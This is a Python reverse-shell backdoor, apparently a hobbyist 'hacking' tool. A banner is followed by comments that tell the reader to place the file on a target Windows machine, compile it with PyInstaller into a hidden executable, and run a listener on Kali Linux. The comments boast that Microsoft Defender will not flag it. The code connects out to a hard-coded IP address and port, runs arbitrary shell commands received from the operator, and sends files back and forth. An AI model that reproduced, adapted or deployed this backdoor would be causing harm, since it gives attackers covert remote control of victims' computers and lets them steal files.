#				#	#		  #  #		#	   #		   #
#			  # #	#		  #    #	#	   #		 # #
#		     #  #	#		  #     #   #	   #		#  #
#	        #	#	#		  #    #	#	   #	   #   #
#		   ######	#		  #  #		########	  ######
#		  #		#	#		  #			#	   #	 #	   #
#		 #		#	#		  #			#	   #	#	   #
#		#       #   #######   #			#	   #   #       #   

# INSTRUCTIONS :
#
# Copy the backdoor.py file to Desktop of target windows machine
# Navigate to the desktop in terminal and run
#		pip install pyinstaller
#			and
#		pyinstaller backdoor.py --onefile --noconsole
# Now we get 3 folders and 1 file on Desktop. They are
#					1. dist			(Folder)
#					2. build		(Folder)
#					3. __pycache__		(Folder)
#					4. backdoor.spec 	 (File)
# We can delete all those EXCEPT "dist" Folder
# In the dist Folder we have "backdoor.exe" file
# Run server.py in kali linux
# Now open the backdoor.exe on windows
# The backdoor.exe file can be scanned with Microsoft defender, and no threats will be found !!


import socket
import time
import json
import subprocess
import os


def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())


def reliable_receive():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue


def connection():
	while True:
		time.sleep(10)
		try:
			s.connect(('192.168.172.229', 5555))
			shell()
			s.close()
			break
		except:
			connection()


def upload_file(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())


def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                        chunk = s.recv(1024)
                except socket.timeout as e:
                        break
        s.settimeout(None)
        f.close()


def shell():
	while True:
		command = reliable_receive()
		if command == 'quit':
			break
		elif command == 'clear':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command[:6] == 'upload':
			download_file(command[7:])
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()

